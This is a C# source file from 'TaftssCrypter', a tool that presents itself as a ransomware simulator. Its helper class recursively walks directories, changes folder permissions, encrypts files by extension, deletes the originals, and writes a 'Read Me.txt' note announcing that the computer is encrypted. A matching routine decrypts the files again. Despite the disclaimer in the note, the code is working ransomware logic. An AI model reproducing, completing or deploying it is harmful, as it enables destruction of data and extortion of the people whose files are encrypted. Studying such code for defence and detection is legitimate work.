using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using TaftssCrypter.Helper;
using static TaftssCrypter.Helper.Runner;

namespace TaftssCrypter.Helper
{
    class Helper
    {
        //global variable. You can change it. It works parametrically. :) This is old version part :)
        public string[] customExtensiom = { "*.zip" };
        public string UserName = @"desktop-16g993t\administrator";
        //-------------------------------------------------------
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }
        public void RunnerSetter(string Folder, string password)
        {
            Runner runner = new Runner();

            foreach (var item in customExtensiom)
            {
                DirectoryInfo dInfo = new DirectoryInfo(Folder);
                DirectorySecurity dSecurity = dInfo.GetAccessControl();
                dSecurity.AddAccessRule(new FileSystemAccessRule(UserName, FileSystemRights.ReadData, AccessControlType.Allow));
                dInfo.SetAccessControl(dSecurity);
                string[] fileEntries = Directory.GetFiles(Folder, item);

                foreach (string fileName in fileEntries)
                {
                    try
                    {
                        string[] filename = { Folder, fileName };
                        string fullpath = Path.Combine(filename);
                        runner.FileRunner(fullpath, password);
                        File.Delete(fullpath);
                        NoteCreater(Folder);

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!]  Folder Access Denied. Folder Path: " + Folder);
                        continue;
                    }
                }
            }

            string[] subDirectory = Directory.GetDirectories(Folder);
            if (subDirectory != null)
            {
                foreach (var subFolder in subDirectory)
                {
                    try
                    {
                        RunnerSetter(subFolder, password);
                        NoteCreater(subFolder);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!]  Subfolder Access Denied. Subfolder Path: " + subFolder);
                        continue;
                    }

                }
            }
        }

        public void DeRunnerSetter(string Folder, string password)
        {
            if (File.Exists(Folder + @"\Read Me.txt"))
            {
                File.Delete(Folder + @"\Read Me.txt");
            }

            DeRunner derunner = new DeRunner();

            DirectoryInfo dInfo = new DirectoryInfo(Folder);
            DirectorySecurity dSecurity = dInfo.GetAccessControl();
            dSecurity.AddAccessRule(new FileSystemAccessRule(UserName, FileSystemRights.ReadData, AccessControlType.Allow));
            dInfo.SetAccessControl(dSecurity);
            string[] fileEntries = Directory.GetFiles(Folder, "*.Taftss");

            foreach (string fileName in fileEntries)
            {
                try
                {
                    string WithoutExt = fileName.Remove(fileName.Length - 4, 4);
                    string[] Splited = WithoutExt.Split(Convert.ToChar(@"\"));
                    Splited[Splited.Count() - 1] = "decrypted - " + Splited[Splited.Count() - 1];
                    string[] filename = { Folder, fileName };
                    string fullpath = Path.Combine(filename);
                    derunner.FileDeRunner(fullpath, string.Join(@"\", Splited), password);
                    File.Delete(fullpath);

                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!]  Folder Access Denied. Folder Path: " + Folder);
                    continue;
                }

            }

            string[] subDirectory = Directory.GetDirectories(Folder);
            if (subDirectory != null)
            {
                foreach (var subFolder in subDirectory)
                {
                    try
                    {
                        DeRunnerSetter(subFolder, password);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!]  Subfolder Access Denied. Subfolder Path: " + subFolder);
                        continue;
                    }
                }
            }
        }
        public void NoteCreater(string NotePath)
        {
            try
            {
                if (!File.Exists(NotePath))
                {
                    FileStream fs = File.Create(NotePath + @"\Read Me.txt");

                    Byte[] Header = new UTF8Encoding(true).GetBytes("This Computer is encrypted with TaftssCrypter. \n\n TaftssCrypter is a simulation tool. Any use outside of simulation is the user's responsibility. Please do not use it for malicious purposes! ");
                    fs.Write(Header, 0, Header.Length);
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine("[!]  Read Me.txt not created. Path: " + NotePath);
            }
        }
    }
}
